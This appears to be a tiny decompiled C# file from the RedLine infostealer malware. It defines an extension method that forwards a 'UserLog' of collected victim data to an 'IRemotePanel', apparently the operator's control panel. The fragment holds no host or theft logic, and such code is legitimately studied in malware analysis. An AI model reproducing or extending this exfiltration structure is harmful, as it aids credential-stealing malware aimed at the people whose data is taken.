using System;
using RedLine.Models;

namespace RedLine
{
	// Token: 0x02000007 RID: 7
	public static class Ext
	{
		// Token: 0x0600000E RID: 14 RVA: 0x00002488 File Offset: 0x00000688
		public static void SendTo(this UserLog user, IRemotePanel panel)
		{
			panel.SendMe(user);
		}
	}
}
